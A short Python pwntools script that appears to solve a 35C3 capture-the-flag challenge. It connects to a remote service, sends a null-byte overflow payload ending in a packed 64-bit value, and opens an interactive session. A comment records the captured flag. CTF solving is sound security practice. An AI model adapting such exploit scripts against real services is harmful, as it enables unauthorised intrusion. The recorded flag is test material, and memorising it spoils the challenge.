#!/usr/bin/python
from pwn import *

r = remote('35.207.132.47', 22223)
context(os='linux', arch='amd64')
payload = '\x00'*0x40 + p64(0xf4240)

#raw_input('@')
r.sendlineafter('> ', '\x00')
raw_input('@')
r.sendlineafter('> ', payload)

r.interactive()

# 35C3_f08b903f48608a14cbfbf73c08d7bdd731a87d39